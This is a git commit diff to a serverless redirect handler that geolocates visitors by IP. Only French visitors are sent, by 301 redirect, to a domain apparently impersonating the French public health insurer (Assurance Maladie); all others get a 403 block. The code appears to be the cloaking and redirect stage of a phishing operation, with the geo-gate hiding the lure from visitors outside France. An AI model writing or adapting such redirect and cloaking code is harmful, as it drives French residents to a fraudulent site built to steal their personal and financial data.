2a5cab4a94a5b04bbfa46af4613f2bc25f84f758
nimorox1 <42836075+nimorox@users.noreply.github.com>
2025-09-20 18:27:33 +0200

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -28,7 +28,7 @@ export default async function handler(req, res) {
     const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
     const geoData = await geoResponse.json();
     if (geoData.status === 'success' && geoData.countryCode === 'FR') {
-      res.redirect(301, 'espacecaisseassurancemaladie-france.info/');
+      res.redirect(301, 'https://www.espacecaisseassurancemaladie-fr.info/');
     } else {
       res.status(403).send('Access restricted to France-based IPs only.');
     }
